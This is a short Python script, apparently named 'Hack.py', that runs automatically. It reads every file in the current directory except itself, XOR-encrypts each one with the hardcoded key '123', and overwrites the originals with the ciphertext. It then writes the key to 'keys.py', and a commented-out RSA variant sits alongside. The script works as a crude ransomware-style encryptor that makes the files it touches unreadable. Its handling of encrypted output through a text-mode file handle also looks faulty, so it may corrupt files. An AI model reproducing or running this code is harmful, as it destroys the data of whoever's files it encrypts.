import os
import codecs
import re
from Crypto.Cipher import XOR

def OpenFile(file_name, mod):
    try:
        the_file = codecs.open(file_name, mod,encoding='utf-8',errors='ignore')
        # the_file = open(file_name, mod)
    except IOError as e:
        print('Can\'t open file - ',file_name,'. Work will be closed \n', e)
    else:
        return the_file

def Main():
    key = '123'
    for filename in os.listdir(os.getcwd()):
        if filename != 'Hack.py':
            the_file = OpenFile(filename,'r')
            print('New File: '+ filename+'\n')
            string = str(the_file.read())
            # string = re.sub('[^a-zA-Z]',' ',string)
            encrypted = xorCoder(string,key)
            print(encrypted)
            the_file.close()
            the_file = OpenFile(filename, 'w')
            the_file.write(encrypted)
            the_file.close()
    the_file = OpenFile('keys.py','w')
    the_file.write('123')
    the_file.close()


# def Encrypt(string):
#     (bob_pub, bob_priv) = rsa.newkeys(512)
#     # string = string.encode('utf8')
#     crypto = rsa.encrypt(string, bob_pub)
#     return (crypto,bob_priv)
def xorCoder(string, key):
    cipher = XOR.new(key)
    return cipher.encrypt(string)

Main()

